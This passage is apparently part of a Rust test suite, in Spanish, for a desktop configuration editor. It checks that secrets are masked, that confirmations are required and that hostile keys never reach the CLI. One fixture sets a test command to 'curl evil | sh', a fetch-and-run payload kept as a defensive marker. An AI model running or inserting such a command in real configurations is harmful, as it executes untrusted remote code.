        assert!(check_value(spec_of("desktop.workspaces.root"), &json!("~/Trabajo")).is_ok());
        assert!(check_value(
            spec_of("provider.providers.a.baseUrl"),
            &json!("file:///etc")
        )
        .is_err());
        assert!(check_value(
            spec_of("provider.providers.a.baseUrl"),
            &json!("http://x/v1 y")
        )
        .is_err());
        assert!(check_value(
            spec_of("provider.providers.a.baseUrl"),
            &json!("https://••••@host/v1")
        )
        .is_err());
        assert!(check_value(
            spec_of("provider.providers.a.baseUrl"),
            &json!("http://localhost:11434/v1")
        )
        .is_ok());
        assert!(check_value(spec_of("provider.default"), &json!("a.b")).is_err());
    }

    #[test]
    fn un_texto_numerico_no_se_convierte_en_numero() {
        // El valor sale como JSON tipado: «123» sigue siendo texto.
        let v = check_value(spec_of("agents.defaultProfile"), &json!("123")).unwrap();
        assert_eq!(v.to_string(), "\"123\"");
    }

    #[test]
    fn las_direcciones_se_enseñan_sin_credenciales_ni_parametros() {
        assert_eq!(
            safe_url("https://user:pass@host.example/v1"),
            "https://••••@host.example/v1"
        );
        assert_eq!(
            safe_url("https://host.example/v1?key=SECRETO"),
            "https://host.example/v1?••••"
        );
        assert_eq!(
            safe_url("http://localhost:11434/v1"),
            "http://localhost:11434/v1"
        );
        assert!(!safe_url("https://host.example?token=abc").contains("abc"));
    }

    #[test]
    fn solo_una_variable_entera_cuenta_como_referencia() {
        assert_eq!(pure_env_ref("${OPENAI_API_KEY}"), Some("OPENAI_API_KEY"));
        assert_eq!(pure_env_ref("Bearer ${X}"), None);
        assert_eq!(pure_env_ref("${X} y más"), None);
        assert_eq!(pure_env_ref("${}"), None);
        assert_eq!(pure_env_ref("${1X}"), None);
        assert_eq!(pure_env_ref("sk-literal"), None);
    }

    // --- La vista que recibe el webview ----------------------------------------------------

    fn sample_raw() -> Value {
        json!({
            "provider": {
                "default": "nube",
                "providers": {
                    "nube": { "type": "openai-compatible", "baseUrl": "https://u:p@api.example/v1?k=SECRETO",
                               "apiKey": "sk-ABSOLUTAMENTE-SECRETA", "model": "gran-modelo", "contextWindow": 32768 },
                    "local": { "type": "openai-compatible", "baseUrl": "http://localhost:11434/v1", "apiKey": "${OLLAMA_KEY}" },
                }
            },
            "tools": { "webSearch": { "apiKey": "brave-SECRETA-2", "tavilyApiKey": "tvly-SECRETA-3" }, "testCommand": "curl evil | sh" },
            "memory": { "embeddingEndpoint": { "url": "https://emb.example", "apiKey": "emb-SECRETA-4" } },
            "mcp": { "servers": [{ "name": "x", "command": "node", "args": ["--token=MCP-SECRETO"], "env": { "T": "ENV-SECRETO" } }] },
            "ssh": { "hosts": { "a": { "password": "SSH-SECRETA" } } },
            "channels": { "telegram": { "enabled": true } },
            "environments": { "prod": { "match": ["*prod*"], "tier": "production" } },
            "logging": { "level": "debug" },
            "desktop": { "workspaces": { "root": "${HOME}/ws" } },
        })
    }

    #[test]
    fn el_webview_no_recibe_ningun_secreto_ni_el_contenido_de_nivel_c() {
        let view = build_view(&sample_raw(), &defaults(), "/x/.stratumrc.json", None);
        let text = serde_json::to_string(&view).unwrap();
        for secret in [
            "ABSOLUTAMENTE-SECRETA",
            "SECRETO",
            "brave-SECRETA",
            "tvly-SECRETA",
            "emb-SECRETA",
            "MCP-SECRETO",
            "ENV-SECRETO",
            "SSH-SECRETA",
            "curl evil",
            "u:p@",
        ] {
            assert!(!text.contains(secret), "{secret} no debe llegar al webview");
        }
        // Lo que sí: que hay clave, de dónde sale una variable y que hay algo de nivel C.
        let nube = view.providers.iter().find(|p| p.alias == "nube").unwrap();
        assert!(nube.api_key.set && nube.api_key.env_var.is_none());
        assert_eq!(
            nube.base_url.as_deref(),
            Some("https://••••@api.example/v1?••••")
        );
        let local = view.providers.iter().find(|p| p.alias == "local").unwrap();
        assert_eq!(local.api_key.env_var.as_deref(), Some("OLLAMA_KEY"));
        assert!(view
            .cli_only
            .iter()
            .any(|c| c.title.starts_with("Servidores MCP") && c.present));
        assert!(view
            .cli_only
            .iter()
            .any(|c| c.title.starts_with("Hosts SSH") && c.present));
        assert!(view
            .cli_only
            .iter()
            .any(|c| c.title.starts_with("Comando de pruebas") && c.present));
        assert!(view
            .cli_only
            .iter()
            .any(|c| c.title.starts_with("Plugins") && !c.present));
    }

    #[test]
    fn los_campos_traen_valor_efectivo_defecto_y_nivel() {
        let view = build_view(&sample_raw(), &defaults(), "/x", None);
        let field_of = |p: &str| {
            view.sections
                .iter()
                .flat_map(|s| s.fields.iter())
                .find(|f| f.path == p)
                .unwrap_or_else(|| panic!("falta {p}"))
                .clone()
        };
        let level = field_of("logging.level");
        assert_eq!(level.value, json!("debug"));
        assert_eq!(level.default, json!("info"));
        assert!(!level.is_default);
        assert_eq!(level.level, A);
        let confirm = field_of("tools.confirmDestructive");
        assert_eq!(confirm.value, json!(true));
        assert!(confirm.is_default);
        assert_eq!(confirm.level, B);
        // El secreto sale sin valor.
        let key = field_of("tools.webSearch.apiKey");
        assert_eq!(key.value, Value::Null);
        assert!(key.secret.as_ref().unwrap().set);
        // Un valor con variable de entorno en un campo que no es de texto queda bloqueado; el de texto, no.
        let root = field_of("desktop.workspaces.root");
        assert_eq!(root.value, json!("${HOME}/ws"));
        assert!(root.locked.is_none());
        // Los entornos aparecen por nombre.
        assert_eq!(
            field_of("environments.prod.tier").value,
            json!("production")
        );
    }

    #[test]
    fn los_campos_de_un_provider_llevan_su_nivel_para_el_formulario() {
        let view = build_view(&sample_raw(), &defaults(), "/x", None);
        let level = |n: &str| {
            view.provider_fields
                .iter()
                .find(|f| f.name == n)
                .map(|f| f.level)
        };
        assert_eq!(level("baseUrl"), Some(B));
        assert_eq!(level("apiKey"), Some(B));
        assert_eq!(level("model"), Some(A));
        assert_eq!(level("contextWindow"), Some(A));
    }

    #[test]
    fn un_valor_con_variable_en_un_campo_numerico_se_bloquea() {
        let raw = json!({ "daemon": { "maxSessions": "${N}" } });
        let view = build_view(&raw, &defaults(), "/x", None);
        let f = view
            .sections
            .iter()
            .flat_map(|s| &s.fields)
            .find(|f| f.path == "daemon.maxSessions")
            .unwrap();
        assert!(f.locked.is_some());
        let cli = FakeCli::new(raw);
        let err =
            apply_set(&cli, &Ask::yes(), &path(), "daemon.maxSessions", &json!(4)).unwrap_err();
        assert_eq!(err.kind, CommandErrorKind::Rejected);
        assert!(cli.writes().is_empty());
    }

    // --- Escribir -------------------------------------------------------------------------

    #[test]
    fn nivel_a_se_escribe_sin_confirmar_y_por_stdin() {
        let cli = FakeCli::new(json!({}));
        let ask = Ask::no("cancelled"); // si preguntara, fallaría
        let out = apply_set(&cli, &ask, &path(), "logging.level", &json!("warn")).unwrap();
        assert!(out.changed);
        assert_eq!(out.restart, Some(Restart::Daemon));
        assert!(ask.seen.borrow().is_empty());
        assert_eq!(
            cli.writes(),
            vec![("logging.level".to_string(), "\"warn\"".to_string())]
        );
        // Siempre `--global --json --stdin`, nunca el valor en la línea de comandos.
        let calls = cli.calls.borrow();
        let set = calls.iter().find(|(a, _)| a[1] == "set").unwrap();
        assert_eq!(
            set.0,
            [
                "config",
                "set",
                "--global",
                "--json",
                "--stdin",
                "logging.level"
            ]
        );
        assert!(!set.0.iter().any(|a| a.contains("warn")));
    }

    #[test]
    fn nivel_b_no_escribe_si_no_se_confirma() {
        for reason in ["cancelled", "expired"] {
            let cli = FakeCli::new(json!({}));
            let ask = Ask::no(reason);
            let err = apply_set(
                &cli,
                &ask,
                &path(),
                "tools.confirmDestructive",
                &json!(false),
            )
            .unwrap_err();
            assert_eq!(err.kind, CommandErrorKind::NotConfirmed);
            assert!(cli.writes().is_empty(), "no debe escribir tras {reason}");
        }
    }

    #[test]
    fn nivel_b_confirma_con_clave_valor_viejo_y_nuevo() {
        let cli = FakeCli::new(json!({}));
        let ask = Ask::yes();
        apply_set(
            &cli,
            &ask,
            &path(),
            "tools.confirmDestructive",
            &json!(false),
        )
        .unwrap();
        let seen = ask.seen.borrow();
        assert_eq!(seen.len(), 1);
        assert_eq!(seen[0].key, "tools.confirmDestructive");
        assert_eq!(seen[0].old.as_deref(), Some("sí (por defecto)"));
        assert_eq!(seen[0].new.as_deref(), Some("no"));
        assert_eq!(cli.writes().len(), 1);
    }

    #[test]
    fn si_el_valor_cambia_mientras_se_confirma_no_se_escribe() {
        let cli = FakeCli::new(json!({ "tools": { "confirmDestructive": true } }));
        let tamper = || {
            *cli.raw.borrow_mut() = json!({ "tools": { "confirmDestructive": false } });
        };
        let ask = Ask {
            answer: Ok(()),
            seen: RefCell::new(Vec::new()),
            meanwhile: Some(&tamper),
        };
        let err = apply_set(
            &cli,
            &ask,
            &path(),
            "tools.confirmDestructive",
            &json!(false),
        )
        .unwrap_err();
        assert_eq!(err.kind, CommandErrorKind::Rejected);
        assert!(err.message.contains("cambió mientras confirmabas"));
        assert!(cli.writes().is_empty());
    }

    #[test]
    fn un_secreto_nuevo_es_nivel_b_y_su_valor_no_va_a_la_ventana_ni_al_resultado() {
        let cli = FakeCli::new(sample_raw());
        let ask = Ask::yes();
        let out = apply_set(
            &cli,
            &ask,
            &path(),
            "provider.providers.nube.apiKey",
            &json!("sk-NUEVA-MUY-SECRETA"),
        )
        .unwrap();
        let seen = ask.seen.borrow();
        let shown = serde_json::to_string(&*seen).unwrap();
        assert!(
            !shown.contains("NUEVA"),
            "la ventana no debe llevar el secreto: {shown}"
        );
        assert!(!shown.contains("ABSOLUTAMENTE"));
        assert!(seen[0]
            .note
            .as_deref()
            .unwrap()
            .contains("clave de API del provider «nube»"));
        assert_eq!(seen[0].old, None);
        assert_eq!(seen[0].new, None);
        // El resultado que vuelve al webview tampoco.
        let back = serde_json::to_string(&out).unwrap();
        assert!(!back.contains("NUEVA") && !back.contains("ABSOLUTAMENTE"));
        // Pero sí se escribió, por stdin.
        assert_eq!(cli.writes()[0].1, "\"sk-NUEVA-MUY-SECRETA\"");
        assert!(!cli
            .calls
            .borrow()
            .iter()
            .any(|(a, _)| a.iter().any(|x| x.contains("NUEVA"))));
    }

    #[test]
    fn un_secreto_como_variable_se_conserva_literal() {
        let cli = FakeCli::new(sample_raw());
        let ask = Ask::yes();
        apply_set(
            &cli,
            &ask,
            &path(),
            "provider.providers.local.apiKey",
            &json!("${OTRA_VAR}"),
        )
        .unwrap();
        assert_eq!(cli.writes()[0].1, "\"${OTRA_VAR}\"");
        assert!(ask.seen.borrow()[0]
            .note
            .as_deref()
            .unwrap()
            .contains("OTRA_VAR"));
    }

    #[test]
    fn nivel_c_y_claves_hostiles_no_llegan_a_la_cli() {
        let cli = FakeCli::new(json!({}));
        for key in [
            "plugins.enabled",
            "mcp.servers",
            "tools.testCommand",
            "desconocida.x",
            "__proto__.x",
            "a..b",
            "ssh.hosts.a.password",
        ] {
            let err = apply_set(&cli, &Ask::yes(), &path(), key, &json!("x")).unwrap_err();
            assert!(
                matches!(
                    err.kind,
                    CommandErrorKind::Rejected | CommandErrorKind::Invalid
                ),
                "{key}"
            );
        }
        assert!(
            cli.calls.borrow().is_empty(),
            "ni siquiera se consulta a la CLI"
        );
    }

    #[test]
    fn un_valor_invalido_no_llega_a_la_cli() {
        let cli = FakeCli::new(json!({}));
        let err = apply_set(
            &cli,
            &Ask::yes(),
            &path(),
            "logging.level",
            &json!("ruidoso"),
        )
        .unwrap_err();
        assert_eq!(err.kind, CommandErrorKind::Invalid);
        assert!(cli.calls.borrow().is_empty());
    }

    #[test]
    fn el_mismo_valor_no_escribe_nada() {
        let cli = FakeCli::new(json!({ "logging": { "level": "debug" } }));
        let out = apply_set(
            &cli,
            &Ask::no("cancelled"),
            &path(),
            "logging.level",
            &json!("debug"),
        )
        .unwrap();
        assert!(!out.changed);
        assert!(cli.writes().is_empty());
    }

    #[test]
    fn el_fallo_de_la_cli_se_enseña_tal_cual_y_sin_secretos() {
        let cli = FakeCli::new(sample_raw());
        *cli.fail_set.borrow_mut() = Some(CliError::Failed {
            stderr: "La config no es válida:\n  - provider.providers.nube.apiKey: sk-NUEVA-SECRETA no vale\n".into(),
        });
        let err = apply_set(
            &cli,
            &Ask::yes(),
            &path(),
            "provider.providers.nube.apiKey",
            &json!("sk-NUEVA-SECRETA"),
        )
        .unwrap_err();
        assert_eq!(err.kind, CommandErrorKind::Rejected);
        assert!(err.message.contains("La config no es válida"));
        assert!(err.message.contains("sigue como estaba"));
        assert!(!err.message.contains("NUEVA-SECRETA"));
        // Un fallo de un campo normal sí se enseña entero.
        let cli = FakeCli::new(json!({}));
        *cli.fail_set.borrow_mut() = Some(CliError::Failed {
            stderr: "logging.level: Invalid enum value".into(),
        });
        let err =
            apply_set(&cli, &Ask::yes(), &path(), "logging.level", &json!("warn")).unwrap_err();
        assert!(err.message.contains("Invalid enum value"));
    }

    #[test]
    fn un_plazo_agotado_no_afirma_que_se_escribio_ni_que_no() {
        let cli = FakeCli::new(json!({}));
        *cli.fail_set.borrow_mut() = Some(CliError::Timeout);
        let err =
            apply_set(&cli, &Ask::yes(), &path(), "logging.level", &json!("warn")).unwrap_err();
        assert_eq!(err.kind, CommandErrorKind::Unknown);
    }

    #[test]
    fn cli_ausente_vieja_o_rota_deja_el_editor_en_solo_lectura() {
        let cases: Vec<(CliError, &str, &str)> = vec![
            (CliError::NotFound, "missing", "No se encuentra la CLI"),
            (
                CliError::Failed {
                    stderr: "error: unknown option '--global'".into(),
                },
                "outdated",
                "actualiza la CLI",
            ),
            (
                CliError::Failed {
                    stderr: "error: too many arguments for 'config'.".into(),
                },
                "outdated",
                "actualiza la CLI",
            ),
            (
                CliError::Failed {
                    stderr: "/x/.stratumrc.json no es un JSON válido (línea 1)".into(),
                },
                "broken",
                "JSON válido",
            ),
            (CliError::Timeout, "broken", "no contestó"),
        ];
        for (error, cli_state, text) in cases {
            let cli = FakeCli::new(json!({ "logging": { "level": "debug" } }));
            *cli.list_error.borrow_mut() = Some(error);
            let view = load_view(&cli, &path());
            assert_eq!(view.state, "readOnly");
            assert_eq!(view.cli, cli_state);
            assert!(
                view.reason.as_deref().unwrap().contains(text),
                "{:?}",
                view.reason
            );
            // Y escribir es imposible: ni se intenta.
            let err =
                apply_set(&cli, &Ask::yes(), &path(), "logging.level", &json!("warn")).unwrap_err();
            assert_eq!(err.kind, CommandErrorKind::Rejected);
            assert!(cli.writes().is_empty());
        }
    }

    #[test]
    fn una_salida_que_no_se_entiende_cuenta_como_cli_vieja() {
        struct Odd(&'static str);
        impl CliRunner for Odd {
            fn run(&self, _: &[&str], _: Option<&str>) -> Result<CliOutput, CliError> {
                Ok(CliOutput {
                    stdout: self.0.into(),
                })
            }
        }
        for stdout in [
            "",
            "no es json",
            "{}",
            r#"{"format":2,"raw":{},"defaults":{}}"#,
            r#"{"format":1}"#,
        ] {
            assert_eq!(load_view(&Odd(stdout), &path()).cli, "outdated", "{stdout}");
        }
    }

    #[test]
    fn un_fichero_de_un_stratum_mas_nuevo_no_se_edita() {
        let mut cli = FakeCli::new(json!({ "schemaVersion": 99 }));
        cli.writable = false;
        let view = load_view(&cli, &path());
        assert_eq!(view.state, "readOnly");
        assert_eq!(view.cli, "newer");
        let err =
            apply_set(&cli, &Ask::yes(), &path(), "logging.level", &json!("warn")).unwrap_err();
        assert_eq!(err.kind, CommandErrorKind::Rejected);
        assert!(cli.writes().is_empty());
    }

    #[test]
    fn solo_se_editan_providers_y_entornos_que_existen() {
        let cli = FakeCli::new(sample_raw());
        let err = apply_set(
            &cli,
            &Ask::yes(),
            &path(),
            "provider.providers.fantasma.model",
            &json!("x"),
        )
        .unwrap_err();
        assert_eq!(err.kind, CommandErrorKind::Invalid);
        let err = apply_set(
            &cli,
            &Ask::yes(),
            &path(),
            "environments.nuevo.tier",
            &json!("staging"),
        )
        .unwrap_err();
        assert_eq!(err.kind, CommandErrorKind::Invalid);
        let err = apply_set(
            &cli,
            &Ask::yes(),
            &path(),
            "provider.default",
            &json!("fantasma"),
        )
        .unwrap_err();
        assert_eq!(err.kind, CommandErrorKind::Invalid);
        assert!(cli.writes().is_empty());
        apply_set(
            &cli,
            &Ask::yes(),
            &path(),
            "provider.default",
            &json!("local"),
        )
        .unwrap();
    }

    // --- Añadir un provider -----------------------------------------------------------------

    fn new_provider(alias: &str) -> NewProvider {
        NewProvider {
            alias: alias.into(),
            base_url: "https://api.example/v1".into(),
            api_key: "sk-PROVIDER-NUEVO-SECRETO".into(),
            model: "m1".into(),
            make_default: true,
        }
    }

    #[test]
    fn añadir_un_provider_confirma_sin_la_clave_y_lo_deja_por_defecto() {
        let cli = FakeCli::new(sample_raw());
        let ask = Ask::yes();
        let out = apply_add_provider(&cli, &ask, &path(), &new_provider("otro")).unwrap();
        assert!(out.changed);
        let shown = serde_json::to_string(&*ask.seen.borrow()).unwrap();
        assert!(!shown.contains("SECRETO"));
        assert!(shown.contains("otro"));
        let writes = cli.writes();
        assert_eq!(writes[0].0, "provider.providers.otro");
        assert!(
            writes[0].1.contains("openai-compatible")
                && writes[0].1.contains("PROVIDER-NUEVO-SECRETO")
        );
        assert_eq!(
            writes[1],
            ("provider.default".to_string(), "\"otro\"".to_string())
        );
        assert!(!serde_json::to_string(&out)
            .unwrap()
            .contains("PROVIDER-NUEVO"));
    }

    #[test]
    fn el_primer_provider_se_crea_con_su_default_de_una_vez() {
        let cli = FakeCli::new(json!({}));
        apply_add_provider(&cli, &Ask::yes(), &path(), &new_provider("uno")).unwrap();
        let writes = cli.writes();
        assert_eq!(writes.len(), 1);
        assert_eq!(writes[0].0, "provider");
        let block: Value = serde_json::from_str(&writes[0].1).unwrap();
        assert_eq!(block["default"], json!("uno"));
        assert_eq!(
            block["providers"]["uno"]["baseUrl"],
            json!("https://api.example/v1")
        );
    }

    #[test]
    fn añadir_un_provider_sin_confirmar_no_escribe_y_un_alias_repetido_se_rechaza() {
        let cli = FakeCli::new(sample_raw());
        let err = apply_add_provider(&cli, &Ask::no("cancelled"), &path(), &new_provider("otro"))
            .unwrap_err();
        assert_eq!(err.kind, CommandErrorKind::NotConfirmed);
        assert!(cli.writes().is_empty());
        let err =
            apply_add_provider(&cli, &Ask::yes(), &path(), &new_provider("nube")).unwrap_err();
        assert_eq!(err.kind, CommandErrorKind::Invalid);
        for alias in ["con punto.x", "", "a/b", "-x"] {
            let err =
                apply_add_provider(&cli, &Ask::yes(), &path(), &new_provider(alias)).unwrap_err();
            assert_eq!(err.kind, CommandErrorKind::Invalid, "{alias:?}");
        }
        let mut bad = new_provider("ok");
        bad.base_url = "ftp://x".into();
        assert!(apply_add_provider(&cli, &Ask::yes(), &path(), &bad).is_err());
        assert!(cli.writes().is_empty());
    }

    #[test]
    fn un_provider_que_aparece_mientras_se_confirma_no_se_pisa() {
        let cli = FakeCli::new(sample_raw());
        let tamper = || {
            let mut raw = cli.raw.borrow_mut();
            raw["provider"]["providers"]["otro"] =
                json!({ "type": "openai-compatible", "baseUrl": "http://x" });
        };
        let ask = Ask {
            answer: Ok(()),
            seen: RefCell::new(Vec::new()),
            meanwhile: Some(&tamper),
        };
        let err = apply_add_provider(&cli, &ask, &path(), &new_provider("otro")).unwrap_err();
        assert_eq!(err.kind, CommandErrorKind::Rejected);
        assert!(cli.writes().is_empty());
    }
}
